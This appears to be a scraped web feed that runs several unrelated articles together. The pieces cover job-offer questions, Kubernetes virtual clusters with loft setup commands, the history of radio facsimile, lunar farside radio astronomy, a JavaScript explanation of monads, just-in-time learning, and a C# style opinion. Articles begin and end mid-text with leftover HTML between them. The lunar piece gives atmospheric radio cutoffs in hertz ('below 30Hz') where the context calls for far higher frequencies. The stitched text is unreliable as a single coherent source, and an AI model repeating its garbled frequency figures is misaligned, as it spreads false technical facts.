<p>As a result, your progress can stagnate. That means you do not improve as a developer and a person, and it is going to be difficult for you to find another job. Believe me; you do not want that to happen. Thus, ask the company how they support their employees to improve as developers and persons.</p>

<p>If the opportunity of contributing to an open-source project arises, can you do it? This is another point you want to clarify with your prospective employers.</p>
<p>Contributing to open-source projects is an excellent way of getting out a rut, and improve your programming skills. As long as the projects do not clash with the company, they should allow you to contribute to open-source projects. And of course, as long as you do it in your free time.</p>
<p>In conclusion, do not forget to ask your prospective employer if they allow you to contribute to OSS.</p>

<p>Having a mentor is super beneficial for you. Especially at the beginning of your career. Being able to go to someone when you struggle to give you a hand is instrumental. However, do not confuse a mentor with a person that should spoon-feed you.</p>
<p>The mentors should be there to give you pointers and guide you. A mentor is not a person that solves your problems. However, if mentoring is available and done right, it is beneficial for both persons.</p>
<p>In conclusion, make sure the company is offering you mentorship. Proper mentorship helps you develop faster.</p>

<p>The questions from the article are not exhaustive, and you can add more questions. In fact, I would like to hear and discover more questions. You can never be too careful with contracts.</p>
<p>Until then, do not forget to ask about the:</p>
<ol>
<li><strong>ownership of you side projects</strong></li>
<li><strong>progression paths</strong></li>
<li><strong>mentorship</strong></li>
<li><strong>contributing to OSS</strong></li>
</ol>
<p>I hope the article helps you understand what should you clarify before accepting a job offer!</p>

<p>With the increasing adoption of Kubernetes within organizations, the need for Kubernetes access for applications and engineers is also growing. Since it is neither feasible nor cost-efficient to always use whole physical Kubernetes clusters, virtualization for Kubernetes is the obvious solution. In this article, I will describe an implementation of such a Kubernetes virtualization: Virtual clusters. I will also explain how virtual Kubernetes clusters work, how they can be used, and why they are a real alternative to current approaches for Kubernetes access.</p>

<h2 id="current-approaches-for-kubernetes-access">Current Approaches For Kubernetes Access</h2>

<h3 id="namespaces">Namespaces</h3>

<p>The idea of virtualization within Kubernetes is not new: <a href="https://kubernetes.io/docs/concepts/overview/working-with-objects/namespaces/">In the official Kubernetes documentation</a>, namespaces are labeled “virtual clusters” that span a single physical cluster and provide a joint scope for related Kubernetes objects.
With namespaces, it is possible to create separate environments for multiple apps and users in the same Kubernetes cluster.</p>

<p>However, namespaces have some limitations: They cannot contain cluster scoped resources.
While this may seem obvious, a lot of applications actually need to create or at least access cluster scoped resources like nodes, cluster roles, persistent volumes and storage classes.
As soon as this happens, the application breaks its virtual namespace boundary and cannot be properly isolated from other applications anymore.</p>

<p>Problems go even further if applications need to create their own custom resource definition or extend the API server via an APIService.</p>

<h3 id="many-small-clusters">Many Small Clusters</h3>

<p>To solve these issues and create securely isolated ephemeral environments for applications during testing and development, the pattern of spinning up small, throw-away Kubernetes clusters has emerged.</p>

<p>Spinning up small, throw-away Kubernetes clusters solves the problem of coping with cluster scoped resources and isolation, but it is very cost-inefficient and negates one of the key advantages of Kubernetes itself: Being an orchestration system.
Imagine the cost of a single cluster running 1000 containers vs 1000 Kubernetes clusters running a single container:</p>

<ul>
<li>Each cluster has at least an additional API server, controller manager and etcd.</li>
<li>Each cluster needs at least one kubelet with kube-proxy, networking and container runtime.</li>
<li>Spinning up a new cluster takes way more time than starting a new container.</li>
</ul>

<p>That is a lot of overhead, which can also result in a significant rise in your infrastructure bill (not even mentioning cluster management fees, such as in <a href="https://aws.amazon.com/eks/pricing/?nc1=h_ls">AWS</a> and <a href="https://cloud.google.com/kubernetes-engine/pricing">Google Cloud</a>).</p>

<p><strong>Another solution is to extend namespaces and to virtualize Kubernetes itself.</strong></p>

<h2 id="how-do-virtual-kubernetes-clusters-work">How Do Virtual Kubernetes Clusters Work?</h2>

<p>The idea of virtualizing a Kubernetes cluster is similar to virtualizing a physical machine: The host system is used for actual computing, while everything else is emulated.</p>

<h3 id="existing-solutions-for-virtual-clusters">Existing Solutions for Virtual Clusters</h3>

<p>There are already different implementations of the virtual cluster pattern in Kubernetes:</p>

<ul>
<li><strong><a href="https://github.com/loft-sh/loft">loft vClusters</a>:</strong> A closed source (but <a href="https://loft.sh/pricing">free for up to 3 users</a>) implementation of virtual clusters.</li>
<li><strong><a href="https://github.com/kubernetes-sigs/multi-tenancy/tree/master/incubator/virtualcluster">Multi-Tenancy SIG Virtual Cluster</a>:</strong> An unreleased implementation of a virtual cluster operator for Kubernetes v1.16.</li>
<li><strong><a href="https://github.com/ibuildthecloud/k3v">k3v</a>:</strong> A Proof of Concept of how virtual clusters could work with k3s.</li>
</ul>

<p>This article will mostly talk about the implementation of virtual Kubernetes clusters (vClusters) with <a href="https://loft.sh/">loft</a>.</p>

<h3 id="technical-implementation-of-virtual-clusters">Technical Implementation of Virtual Clusters</h3>

<p>The basic idea of a virtual cluster is to spin up a new Kubernetes cluster within an existing cluster and sync certain core resources between those two clusters.</p>

<p>A host cluster runs the actual virtual clusters pods and needs to be a fully working Kubernetes cluster. The virtual cluster itself only consists of the core Kubernetes components: API server, controller manager and etcd.</p>

<p>To reduce virtual cluster overhead for vClusters in loft, loft builds on <a href="https://k3s.io/">k3s</a>, which is a fully working, lightweight Kubernetes distribution that compiles the Kubernetes components into a single binary and disables all unnecessary Kubernetes features, such as the pod scheduler.</p>

<p>Besides k3s, there is a Kubernetes hypervisor that emulates a fully working Kubernetes setup in the virtual cluster. This component syncs certain virtual cluster resources to the host cluster and back:</p>

<ul>
<li><strong>Pods:</strong> All pods that are started in the virtual cluster are mutated and started in the namespace of the virtual cluster in the host cluster. Service account tokens, environment variables, DNS and other configurations are exchanged to point to the virtual cluster instead of the host cluster. Within the pod, it so seems that the pod is started in the virtual cluster instead of the host cluster.</li>
<li><strong>Services:</strong> All services and endpoints are mutated and created in the namespace of the virtual cluster in the host cluster. The virtual and host cluster share the same service cluster IPs.</li>
<li><strong>PersistentVolumeClaims:</strong> If persistent volume claims are created in the virtual cluster, they will be mutated and created in the namespace of the virtual cluster in the host cluster. If they are bound in the host cluster, the corresponding persistent volume will be synced back to the virtual cluster.</li>
<li><strong>Others:</strong> Other resources such as configmaps, secrets, nodes, persistent volumes and storage classes are also synced between the clusters to assure correct functionality of pods.</li>
</ul>

<p>Besides the synchronization of virtual and host cluster resources, the hypervisor also redirects certain Kubernetes API requests to the host cluster, such as port forwarding or pod/service proxying. It essentially acts as a reverse proxy for the virtual cluster.</p>

<p><img src="https://loft.sh/blog/images/content/vcluster-architecture.png?nf_resize=fit&amp;w=800" alt="" title="Virtual Cluster Architecture"></p>

<p>In the host cluster, all created resources by a virtual cluster are encapsulated in a single namespace (it is also possible to have multiple virtual clusters within a single namespace), which allows system admins to restrict resources of a virtual cluster via resource quotas.
With this architecture, virtual clusters improve isolation:</p>

<ul>
<li>Only certain namespaced resources are synced and available in the host cluster (such as Pods, Services, ConfigMaps etc.).</li>
<li>Users and pods that need to communicate with the virtual cluster (such as operators) now communicate only with the virtual Kubernetes API server instead of the host Kubernetes API server.</li>
<li>Pods cannot directly access host cluster resources.</li>
<li>Virtual cluster resources don’t pollute the host cluster etcd.</li>
</ul>

<p>Since the virtual cluster is a working Kubernetes cluster itself, it is also even possible to install virtual clusters within virtual clusters.</p>

<h2 id="how-to-create-vclusters-in-loft">How to Create vClusters in loft</h2>

<p>To test how virtual clusters work and if they could fit your use case, you can use <a href="https://loft.sh/">loft</a>, a multi-tenancy manager for Kubernetes.
Virtual clusters should work in most Kubernetes clusters above version v1.14 that support persistent volume claims.</p>

<p>You can set up loft for free on your local Kubernetes cluster or in any cloud provider via the following helm commands (see the <a href="https://loft.sh/docs/getting-started/setup">official docs</a> for more information):</p>

<pre><code># Install ingress controller in the cluster
helm install nginx-ingress nginx-ingress --repo https://kubernetes-charts.storage.googleapis.com \
  --namespace nginx-ingress \
  --set-string controller.config.hsts=false \
  --create-namespace \
  --wait

# Install loft with self signed certificate
# Change loft.localhost to your desired url
# and make sure the URL points to the ingress
# controller LoadBalancer external ip
helm install loft loft --repo https://charts.devspace.sh/ \
  --namespace loft \
  --create-namespace \
  --set admin.username=admin \
  --set admin.password=admin \
  --set certIssuer.create=false \
  --set ingress.host=loft.localhost \
  --set ingress.tls.secret=loft-cert \
  --set cluster.connect.local=true \
  --wait
</code></pre>

<p>Wait until loft is running and make sure you install the <a href="https://loft.sh/docs/getting-started/setup#install-loft-cli">loft CLI</a> and log in to your loft instance:</p>

<pre><code># Login in the UI with admin:admin
loft login https://loft.localhost --insecure
</code></pre>

<p>You can now create a new virtual cluster via the loft CLI in any namespace you like:</p>

<pre><code># if the namespace does not exist, loft will create it for you
loft create vcluster test --space mynamespace
</code></pre>

<p>If the command ends successfully, loft will also switch your current local kube-context to access the virtual cluster, which you can test via <code>kubectl</code>:</p>

<pre><code>kubectl get namespaces
NAME              STATUS   AGE
default           Active   37s
kube-system       Active   37s
kube-public       Active   37s
kube-node-lease   Active   37s
</code></pre>

<p>You can now use the vCluster in the same way as any other Kubernetes cluster.</p>

</blockquote>

<h2 id="advantages-and-limitations-of-virtual-clusters">Advantages and Limitations of Virtual Clusters</h2>

<p>We think virtual clusters are an interesting new technology that can drastically reduce cost and effort for several use cases, such as ephemeral environments.
Compared to the approach of creating many small independent clusters, virtual clusters have multiple advantages:</p>

<ul>
<li>Less cluster boilerplate (one k3s pod in a shared host cluster vs a complete standalone Kubernetes cluster)</li>
<li>Easier to manage (helm deploy/delete vs custom terraform scripts)</li>
<li>Less startup and teardown time (seconds vs minutes)</li>
</ul>

<p>While virtual clusters seem promising, they also have some limitations that should be taken into consideration:</p>

<ul>
<li>Not all Kubernetes features work in virtual clusters (e.g. virtual storage classes, virtual container runtimes, network plugins etc.).</li>
<li>Isolation between standalone clusters is obviously still better than between virtual clusters having the same host cluster.</li>
</ul>

<h2 id="conclusion">Conclusion</h2>

<p>Virtual clusters have the potential to become an important component in the Kubernetes ecosystem. Being more cost-effective and easier to manage than many small clusters while at the same time being better isolated than namespaces makes virtual clusters a superior solution for many use cases.

	<br><span>INTRODUCTION</span></p>
    <p>
	<big>
    In the early 1930’s, radio was the newspaper’s worst enemy.&nbsp; Radio 
    competed for advertising dollars and offered a free news alternative to a 
    cost-conscious public during the depression years.&nbsp; It also offered an 
    immediacy that was not possible for a newspaper, and which publishers feared 
    could undermine their business.&nbsp; The result was a war waged by newspaper 
    interests against radio in the 1930’s that attempted to keep stations from 
    broadcasting the news. &nbsp;The wire services at first boycotted radio 
    completely and later set up a <i>Press Radio Bureau</i> that was designed to 
    give broadcasters limited amounts of news service with restrictions designed 
    to keep radio from competing with newspapers.&nbsp; But some radio stations, 
    particularly WOR in New York, revolted against this attempt by newspaper 
    interests to monopolize news reporting and banded together to form their own 
    news service, the <i>Transradio News</i>.&nbsp; Despite a host of legal 
    challenges, <i>Transradio</i> survived and thrived, and eventually broke the 
    newspapers’ monopoly on the news. &nbsp;The result was an about-face strategy by 
    the newspapers — they began to buy up radio stations in major cities around 
    the country under a “if you can’t beat them, join them”, philosophy.&nbsp; Soon 
    there were stations owned by the major newspapers all over the country:&nbsp; in 
    Chicago, Detroit, Cleveland, St. Louis, Sacramento, San Francisco and 
    elsewhere.&nbsp; </big></p>
    <p>The obvious next step was for newspaper owners to find a way to 
    “synergize” their newspaper-radio combinations.&nbsp; One of the methods they 
    tried was a new technology called Radio Facsimile. </p>
    <p>Radio facsimile had the potential of becoming the 
    “dream application” for newspaper-owned radio stations.&nbsp; In the short term, 
    it would allow them to transmit news bulletins to their subscribers 
    overnight via the airwaves, generating additional subscription and 
    advertising revenue.&nbsp; It also had the long-term potential to eliminate the 
    costly newspaper printing and delivery process completely, allowing the 
    delivery of news to subscribers via radio at a relatively low cost.&nbsp; It 
    could also shift the distribution cost from the publisher to the consumer if 
    the latter could be convinced to purchase and maintain his own facsimile 
    printer.&nbsp; These motives and other factors resulted in a flurry of 
    experimental radio facsimile activity on radio stations around the United 
    States in the latter part of the 1930’s.</p>
    <p><big>&nbsp;<span>EARLY 
	RADIO FACSIMILE EFFORTS</span></big></p>
    <p>&nbsp;The concept of sending images by wire had been around 
    for a long time before it was ever applied to radio.&nbsp; The first rudimentary 
    fax patent was issued in Paris in 1843 and used a swinging pendulum to draw 
    the image.&nbsp; Englishman Edwin Belin first demonstrated his Belinograph in 
    1913.&nbsp; Western Union and AT&amp;T both transmitted photos via wire in the early 
    1920’s, and the technology was quickly accepted by the press as a way to 
    send newspaper photos instantly to cities around the country.&nbsp; RCA was the 
    first company to adapt facsimile to radio, and sent a transoceanic image of 
    President Calvin Coolidge from New York to London on November 29, 1924.&nbsp; Two 
    years later, RCA began a commercial service of transmitting transoceanic 
    photos by shortwave radio for the newspaper industry, and transmitting 
    weather maps to ships at sea.&nbsp; RCA’s patented “Photoradio” technology was 
    invented by RCA scientists Richard H. Ranger and Charles J. Young.&nbsp; It used 
    a rotating drum and a photoelectric scanner to convert a document into a 
    continuous tone that varied in pitch with changes in the image.&nbsp; The image 
    was reproduced on the receiving end with another rotating drum having a 
    stylus that pressed black carbon paper against white paper to reproduce the 
    image. </p>
    <p>
	<big>&nbsp;A few radio broadcasters showed early interest in 
    adapting the technology to send pictures to the public.&nbsp; KPO in San 
    Francisco, owned by the <i>San Francisco Chronicle</i>, became the first 
    radio broadcaster to transmit a photograph by radio when it transmitted a 
    picture of cartoon character Andy Gump on August 22, 1925.&nbsp; The image was 
    signed by <i>Chronicle</i> publisher George T. Cameron with the message 
    "Radio's latest wonder - pictures through the air.&nbsp; What new marvels will 
    this science bring forth?"&nbsp;&nbsp; The image was received on a single machine 
    invented by C. Francis Jenkins. &nbsp;Some other early radio broadcasters who 
    experimented with the transmission of images via AM broadcasting were KSD, 
    owned by the <i>St. Louis Post-Dispatch</i>, WTMJ, the <i>Milwaukee Journal</i> 
    station, and WOR in Newark.&nbsp; In fact, KSD had conducted experiments with 
    facsimile transmission over phone lines as early as 1923. &nbsp;WOR used the 
    Cooley-Ray Foto System developed by Austin Cooley to transmit images late at 
    night.&nbsp; Experimenters could make their own Cooley-Ray receivers by modifying 
    old phonographs. </big></p>
    <p><big>&nbsp;<span>WILLIAM 
	FINCH MARKETS THE RADIO FACSIMILE</span></big></p>
    <p>
	<big>&nbsp;But William G. H. Finch was the person who really 
    brought radio facsimile into the public’s eye.&nbsp; Finch was born in England in 
    1897 and moved to Cincinnati in 1906, where he studied electrical 
    engineering and radio communications at Columbia University and the 
    University of Cincinnati before going to work for the Hearst Family’s <i>
    International News Service</i>.&nbsp; While at the INS, he set up the first radio 
    teletype circuits between New York, Chicago and Havana. </big></p>
    <p>
	<big>&nbsp;While working for the INS, he developed an interest in 
    facsimile machines, and his experiments led him to amass a portfolio of 
    patents that eventually numbered in the hundreds.&nbsp; In 1935, he established 
    his own company, <i>Finch Telecommunications Laboratories</i>, to build and 
    market his system.&nbsp; Unlike RCA, who had only concentrated on the commercial 
    applications of its technology, Finch envisioned the delivery of newspapers 
    to the general public via radio facsimile.&nbsp; The Finch system got around the 
    RCA patents in a number of ways.&nbsp; First, the image details were transmitted 
    by varying the amplitude of an audio tone instead of its frequency.&nbsp; 
    Secondly, it recreated the image by generating an electric current at the 
    tip of a stylus that traced the image onto thermally sensitive paper.&nbsp; 
    Synchronization between the transmitter and receiver was accomplished by 
    using the 60 Hz line voltage frequency.</big></p>
    <p>&nbsp;The Finch scanning head used a light bulb, lens and 
    photocell to focus a pinpoint scanning spot on the document.&nbsp; An electric 
    motor moved the scanning head across the page and another motor advanced the 
    page slightly at the end of each scanning line.&nbsp; The voltage created by the 
    photocell was used to vary the intensity of a high frequency tone, and low 
    frequency sync pulses were inserted to signal the end of each line.&nbsp; The 
    result was an audio signal that could be fed into any conventional AM 
    transmitter.&nbsp; &nbsp;</p>
    <p>The Finch receiver, which sold for $125, was housed in 
    a one-foot square …</p></td></div></div>

<p>The Moon is an object that <a href="https://jatan.space/why-explore-the-moon/">holds immense scientific value</a> by itself. Its airless nature makes it a geological time capsule, allowing scientists to observe its features and infer events that took place in our Solar System millions and even billions of years ago. The Moon also has extrinsic scientific value; scientists consider it a good place for placing radio telescopes to better understand the Universe.</p>



<div><figure><img loading="lazy" width="1024" height="501" src="https://i2.wp.com/jatan.space/wp-content/uploads/2020/08/lunar-radio-telescope.jpg?resize=1024%2C501&amp;ssl=1" alt="" srcset="https://i2.wp.com/jatan.space/wp-content/uploads/2020/08/lunar-radio-telescope.jpg?w=1024&amp;ssl=1 1024w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/08/lunar-radio-telescope.jpg?resize=200%2C98&amp;ssl=1 200w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/08/lunar-radio-telescope.jpg?resize=768%2C376&amp;ssl=1 768w" sizes="(max-width: 1024px) 100vw, 1024px" data-recalc-dims="1"><figcaption>An artist’s impression of radio telescopes on the Moon’s farside.&nbsp;<a href="https://spaceflight.nasa.gov/gallery/images/exploration/lunarexploration/html/s89_25054.html">Credit: NASA</a></figcaption></figure></div>



<p>There are hundreds of radio telescopes on Earth, some of which helped produce the headline-making&nbsp;<a href="https://www.eso.org/public/news/eso1907/">black hole image</a>. Why do radio astronomy from the Moon?</p>



<p>Earth-based radio telescopes are great but can only detect higher frequency emissions from cosmic objects. The Earth’s atmosphere is largely opaque to lower frequencies emitted by these objects, especially below 30Hz. Even observing up to 100 Hz is challenging. Observing at lower frequencies is made more difficult by the multitude of human-built technologies which bombard radio waves in the same range. It just so happens that these lower frequencies are valuable in understanding a as-yet-inaccessible slice of time right after the birth of our Universe.</p>



<p>Enter the Moon, which only shows its one half to Earth because its tidally locked to our planet. The other half, the farside, never sees Earth and is thus shielded from radio interference. The Moon being airless allows detecting low frequency radio waves with no fuss. To that end, one mission on the Moon’s farside is making low frequency observations of the Universe as we speak.</p>



<p>In January 2019, China landed the <a href="https://www.planetary.org/space-missions/change-4">Chang’e 4</a> spacecraft on the Moon’s farside, the first such feat ever. Since the farside cannot see Earth, the lander communicates to us via a relay satellite, Queqiao, placed 65,000 kilometers away in a stable orbit that provides a line of sight to Earth. Both the lander and Queqiao are <a href="http://epizodyspace.ru/bibl/inostr-yazyki/planetary-and-space-science/2018/Jia_et_al_The_Chang-E-4_Mission_Planetary_and_Space_Science_in_press_(2017).pdf">equipped</a> with three five-meter radio antennae to observe the Universe at low frequencies. As the Moon orbits Earth, the spacecraft duo detect emissions ranging from deep space objects like galaxies to ones in our Solar System like the Sun and Jupiter and more.</p>



<div><figure><img loading="lazy" width="1012" height="568" src="https://i1.wp.com/jatan.space/wp-content/uploads/2020/08/change4-lander-render.jpg?resize=1012%2C568&amp;ssl=1" alt="" srcset="https://i1.wp.com/jatan.space/wp-content/uploads/2020/08/change4-lander-render.jpg?w=1012&amp;ssl=1 1012w, https://i1.wp.com/jatan.space/wp-content/uploads/2020/08/change4-lander-render.jpg?resize=200%2C112&amp;ssl=1 200w, https://i1.wp.com/jatan.space/wp-content/uploads/2020/08/change4-lander-render.jpg?resize=768%2C431&amp;ssl=1 768w" sizes="(max-width: 1012px) 100vw, 1012px" data-recalc-dims="1"><figcaption>A render of the Chang’e 4 lander on the Moon’s farside with its three radio antennae deployed. <a href="https://www.planetary.org/space-images/change-4-lander">Credit: CNSA</a></figcaption></figure></div>







<p>Both the Chang’e 4 lander and Queqiao are particularly observing radio emissions by hydrogen atoms in the slice of time between the Universe’s birth and the first stars being born. This slice of time refers to 300 to 800 million years after the Big Bang, the latter being our current consensus of how the Universe began. Currently, Queqiao’s observations are limited to the latter part of this time range because while one of the three antennae <a href="https://room.eu.com/news/change-4-relay-satellite-now-a-radio-telescope">deployed</a> perfectly, the other two were stuck at 2.5 meters length. It will be interesting to see the results coming out from these unprecedented observations from the Change’s 4 mission.</p>



<div><figure><img loading="lazy" width="780" height="307" src="https://i2.wp.com/jatan.space/wp-content/uploads/2020/08/queqiao-antenna.jpg?resize=780%2C307&amp;ssl=1" alt="" srcset="https://i2.wp.com/jatan.space/wp-content/uploads/2020/08/queqiao-antenna.jpg?w=780&amp;ssl=1 780w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/08/queqiao-antenna.jpg?resize=200%2C79&amp;ssl=1 200w, https://i2.wp.com/jatan.space/wp-content/uploads/2020/08/queqiao-antenna.jpg?resize=768%2C302&amp;ssl=1 768w" sizes="(max-width: 780px) 100vw, 780px" data-recalc-dims="1"></figure></div>







<p>Such versatile and near-continuous observation capability of the Chang’e 4 mission is being used to create a radio map of the sky. To further that goal, these two spacecraft are also being tested to make use of interferometry, a technique used by multiple radio observatories on Earth to achieve higher resolution views of cosmic objects. Interferometry is what helped produce the first image of a black hole for instance. In all, the Chang’e 4 mission is demonstrating the potential for radio astronomy on the Moon. China hopes to build on its success with the the launch of <a href="https://spacenews.com/china-is-moving-ahead-with-lunar-south-pole-and-near-earth-asteroid-missions/">Chang’e 7 in 2024</a>.</p>



<p>The radio-queit lunar farside with its access to unique radio frequencies have led astronomers to even propose observing <a href="https://arxiv.org/abs/0902.0493">faint radio emissions from Jupiter-sized exoplanets</a> from the Moon! In the long run, industrially enabled Moon settlements would allow for building larger radio telescopes, perhaps using the plenty of <a href="https://moonmonday.wordpress.com/category/craters/">craters</a> as a naturally available concave base, in the style of <a href="https://en.wikipedia.org/wiki/Arecibo_Observatory">Arecibo</a> and <a href="https://en.wikipedia.org/wiki/Five-hundred-meter_Aperture_Spherical_Telescope">FAST</a>. With interferometry added to the mix, the Moon’s farside will become a valuable place for high resolution and unique radio observations of the Universe.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span><p>I got into a discussion about monads recently. On a search to find some resources to share, I realized that most essays explained them with type signatures and rules. A missing ingredient to grok them, I think, is to understand the intuition behind them. How could you end up <em>inventing</em> monads?</p><p>Okay, let’s try to build that intuition. We’ll avoid both types and category theory.</p><p>Say you have a few functions to get a user, a profile, and a display picture:</p><pre><code>function getUser(id) { 
  return USERS[id] 
}

function getProfile(user) { 
  return user.profile
}

function getDisplayPicture(profile) { 
  return profile.displayPicture
}</code></pre><p>Now, given an id, how would you get the profile picture?</p><p>You could write this: </p><pre><code>getDisplayPicture(getProfile(getUser(id)))</code></pre><p>Buut, this would throw an error: all these functions <em>could</em> return null. If <code>getUser</code> returned null for example, you would see: </p><pre><code>Uncaught TypeError: Cannot read property 'profile' of undefined</code></pre><p>To fix this, you may end up writing something like this:</p><pre><code>function getDisplayPictureFromId(id) { 
  const user = getUser(id)
  if (!user) return
  const profile = getProfile(user)
  if (!profile) return
  return getDisplayPicture(profile)
}</code></pre><p>But, this is getting pretty ugly. All these conditional returns distract from what you’re really trying to do. <strong>What if there was a way to get rid of these conditionals?</strong></p><p>So, that’s our challenge: let’s get rid of these conditionals. One way we can do this, is to make some kind of helper. This helper would let us chain these functions together: </p><pre><code>new Chainer(getUser(id))
  .whenExists(user =&gt; getProfile(user))
  .whenExists(profile =&gt; getDisplayPicture(profile))</code></pre><p>This looks pretty good. Let’s implement it.</p><h2>whenExists</h2><p><code>.whenExists</code> would only run the callback if the value exists. Here’s how you could write this:</p><pre><code>class Chainer {
  constructor(v) { 
      this.value = v
  }
  whenExists(f) { 
      if (!this.value) return this;
      return new Chainer(f(this.value))
  }
}</code></pre><p>And voila, with just this, we can now write</p><pre><code>function getProfilePictureFromId(id) { 
  return new Chainer(getUser(id))
    .whenExists(user =&gt; getProfile(user))
    .whenExists(profile =&gt; getDisplayPicture(profile))
}</code></pre><h2>More Problems</h2><p>Notice that <code>getDisplayPictureFromId</code> now returns a <code>Chainer</code>. </p><p>Imagine we had another function <code>resizeDisplayPicture</code>, that <em>also</em> returned a Chainer</p><pre><code>function resizeDisplayPicture(pic) { 
    return new Chainer(pic).whenExists(pic =&gt; ...
}</code></pre><p>What would happen, if we wrote:</p><pre><code>getProfilePictureFromId(id).whenExists(pic =&gt; resizeDisplayPicture(pic))</code></pre><p>Let’s look at whenExists again:</p><pre><code>whenExists(f) { 
  if (!this.value) return this;
  return new Chainer(f(this.value))
}</code></pre><p>If <code>getProfilePictureFromId(id)</code> did exist, we would run </p><pre><code>new Chainer(f(this.value))</code></pre><p>which in this case is</p><pre><code>new Chainer(resizeDisplayPicture(this.value)) </code></pre><p>Which becomes </p><pre><code>new Chainer(new Chainer(this.value)...</code></pre><p><strong>Uh oh. We now have a Chainer inside of a Chainer.</strong> Ideally, we’d want a function that somehow “merged” these chainers together.</p><h2>whenExistsMerge</h2><p>So let’s do that. We can call it <code>whenExistsMerge</code></p><pre><code>class Chainer {
  constructor(v) { 
      this.value = v
  }
  whenExists(f) { 
      if (!this.value) return this;
      return new Chainer(f(this.value))
  }
  whenExistsMerge(f) { 
      if (!this.value) return this;
      return f(this.value)
  }
}</code></pre><p>And with that, we can write </p><pre><code>getProfilePictureFromId(id)
  .whenExistsMerge(pic =&gt; resizeDisplayPicture(pic))
  .whenExists(resizedPic =&gt; ...)</code></pre><p><strong>Aand voila, you’ve just invented a specific type of monad.</strong> Kind of (1). Chainer is analogous to the <code>Maybe</code> monad. <code>whenExists</code> is analogous to its <code>fmap</code> operation, and <code>whenExistsMerge</code> is analogous to its <code>bind</code> operation. If you’re curious about the type-based technicalities now, <a href="http://adit.io/posts/2013-04-17-functors,_applicatives,_and_monads_in_pictures.html" target="_blank">see this essay</a>. </p><p>So, now we’ve found this cool <code>Chainer</code>. We can stop here, or think a bit further. What’s so special about it? </p><p>Well, it’s like a box that wraps around some information. We can interact with that box with  <code>whenExists</code> and <code>whenExistsMerge</code>.</p><p>How else can we use the idea of <code>box</code> and <code>whenExists?</code></p><p>Here’s one. Let’s say you were dealing with callback hell: </p><pre><code>fetchUser(id, (err, user) =&gt; {
  if (err) ... 
    fetchProfile(profile, (err, profile) =&gt; { 
      if (err) ...
        fetchDisplayPicture(...
    }
}</code></pre><p>What if we created something like an <code>Async Chainer</code>: it stores the result of some future computation. Then, you could use the <code>whenExists*</code> functions, which let you interact with the value <em>when</em> it is computed. We turn the callback hell into</p><pre><code> fetchUser(id).whenExistsMerge(fetchProfile).whenExistsMerge(fetchDisplayPicture)</code></pre><p>Well, replace <code>whenExistsMerge</code> with <code>then</code>, and you're on a road to discover <code>Promise</code>, which is also a monad. Kind of (2). </p><p>Now, it’s pretty cool to notice that both the nullable use case and the async use case have the same interface. The name <code>whenExists</code> may be a bit too specific. Really, what it does is give you an interface to <code>map</code> over the value. If you use the word <code>map</code>, <code>whenExistsMerge</code> really lets you <code>flatMap</code> over the value. </p><p>This begins to get us to the fundamental abstraction of a monad: a box, with an interface for <code>map</code>, and <code>flatMap</code>. As you look deeper, you’ll notice that this abstraction can handle a lot of other things. If you’re curious, research the <code>Result</code> monad for example.</p><p>And with that, you’ve invented monads : ) </p><h2>Aside: Do you <em>really</em> need this?</h2><p>As you went through this, you may have realized that there are other ways to solve the problems that monads solve. Instead of <code>Chainer</code>, your language could have a <a href="https://kotlinlang.org/docs/reference/null-safety.html#safe-calls" target="_blank">safe call</a> abstraction. Instead of <code>Promise</code>, your language could have an <code>async/await</code> abstraction. Sometimes those can be a better <a href="https://www.youtube.com/watch?v=YR5WdGrpoug" target="_blank">better choice</a>. Nevertheless, if your language doesn’t have those abstractions, you can use monads to solve them. And of course, like any powerful abstraction, you can invent new monads to simplify your business logic.</p><hr><p>(1) I cheated a bit with <code>Chainer</code>, by avoiding the subtypes <code>Just</code> and <code>Nothing</code>. This makes it so you can’t express something like <code>Just(null)</code>. Still, it gets at the essence : ) </p><p>(2) Likewise, <code>Promise</code> isn’t quite a monad, because it mixes both <code>flatMap</code> and <code>map</code> with <code>then</code>. This makes it so you can’t have a <code>Promise&lt;Promise&lt;Res&gt;&gt;</code>. Again though, it gets at the essence</p><p><em>Thanks to Joe Averbukh, Mark Shlick, Daniel Woelfel, Irakli Safareli, Jacky Wang for reviewing drafts of this essay</em></p></span></p></div></div></div>]]>

<p>Just-In-Time learning means you learn a thing because you need to know it right then. Just-In-Case learning means you learn a thing because it may come in handy at some point in your life. This separation is <a href="https://hackernoon.com/just-in-case-vs-just-in-time-learning-c87f61d24360">already well documented</a>, even <a href="https://en.wikipedia.org/wiki/Just-in-time_learning">on Wikipedia</a>.</p>



<p>It gets more interesting when you combine it with <a href="https://www.collaborativefund.com/blog/expiring-vs-permanent-skills/">expiring skills vs. permanent skills</a>. Expiring skills will eventually stop being useful, and permanent skills will be just as useful decades from now as they are today. Permanent skills compound over time, and expiring skills don’t. So if you learn an expiring skill, and don’t end up using it right away, then it’s only a matter of time until that skill is irrelevant, and all your time spent learning it was wasted. </p>



<p>If you know a skill is going to eventually expire, then you should only learn it if you’re sure you can use it. <em>Expiring skills should only be learned Just-In-Time, but permanent skills are worthwhile to learn Just-In-Case</em>. But the tricky and somewhat disappointing bit is that the only skills we can consider permanent are soft skills – things like attitude, discipline, charisma. Hard skills like Typescript and Kubernetes will eventually be obsolete, so learning them Just-In-Case is a waste of time.</p>



<p>But then how can I ever become a well rounded technologist, you ask? You work really freaking hard to get on projects with technology you haven’t used before. If you get an opportunity to hop onto a project using some tech that’s new to you, then do it. </p>



<p>When someone asks for some help with a build system you’ve never used before, raise your hand. When a project needs realtime streaming data and you have no idea how to do it, raise your hand. When a client gets excited about creating an Alexa skill, raise your hand. </p>



<p>Raising your hand gets you the best of both worlds. You get to become a well rounded technologist <em>and</em> avoid wasting your time learning technology you won’t ever use.</p>



<p>So raise your hand to learn the hard skills when they’re needed, and spend your Just-In-Case learning on the stuff that will stick around. Put down the Python book (unless you’re working on a Python project) and pick up the book on habit forming, or dealing with difficult people, or taking ownership. That’s the stuff that will compound for the rest of your life.</p>

                    <p>I'm a highly opinionated developer. I've been doing it a little while, and worked with a few other developers, and this is a pet peeve of mine. The <code>this</code> keyword, at least in C#, is oft misused and abused. From henceforth, the context of this post is C# development.</p>
<p>This post seems to have caused a bit of controversy. More to my point, even in base Visual Studio, there are warnings to remove <code>this</code> from your code:
<img src="https://i.imgur.com/9F6Lyx8.png" alt="visual studio 2019"></p>
